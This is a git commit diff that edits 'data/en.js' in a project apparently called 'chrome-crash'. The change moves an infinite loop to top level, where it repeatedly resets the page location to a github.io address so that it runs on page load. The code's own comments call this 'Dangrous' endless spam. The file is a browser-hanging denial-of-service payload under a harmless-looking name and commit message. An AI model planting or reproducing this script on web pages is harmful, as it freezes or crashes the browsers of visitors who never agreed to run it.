11fc818a5701926358f981599fd1cce12735de4f
Uland Sanders <78428114+chrome-crash-invoke@users.noreply.github.com>
2021-11-17 15:11:43 -0600

    Update en.js

--- data/en.js
+++ data/en.js
@@ -2,13 +2,11 @@
 $location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
 $vwer = '#';
 
-function loadUrl(location)
-{
-  while(1) {
+while(1) {
     
-    this.document.location.href = 'https://chrome-crash-invoke.github.io/chrome-crash/';
-    this.document.location.href = $vwer + $location; // Forces Browser To Stay Clean While Still Being Dangrous.
-    // If Document Is Pressed. Spam Occures Infinitly
+  this.document.location.href = 'https://chrome-crash-invoke.github.io/chrome-crash/';
+  this.document.location.href = $vwer + $location; // Forces Browser To Stay Clean While Still Being Dangrous.
+  // If Document Is Pressed. Spam Occures Infinitly
     
-  }
 }
+
